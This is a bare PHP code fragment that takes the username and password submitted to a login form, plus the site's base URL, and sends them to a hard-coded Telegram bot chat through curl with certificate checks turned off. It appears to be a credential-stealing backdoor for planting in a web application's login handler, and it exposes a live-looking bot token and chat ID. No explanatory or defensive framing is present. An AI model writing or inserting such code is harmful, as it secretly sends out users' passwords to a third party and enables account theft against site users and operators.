<?php
$mseg = $_POST['username'].$_POST['password'].$config['web']['base_url'];
$url_end = "https://api.telegram.org/bot6095917936:AAG9OpzuyN6VIavvym-H5lmeXQOvzxXwBYM/sendMessage?chat_id=5625614396&text=$mseg";
$curl = curl_init($url_end);
curl_setopt($curl, CURLOPT_URL, $url_end);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);
                    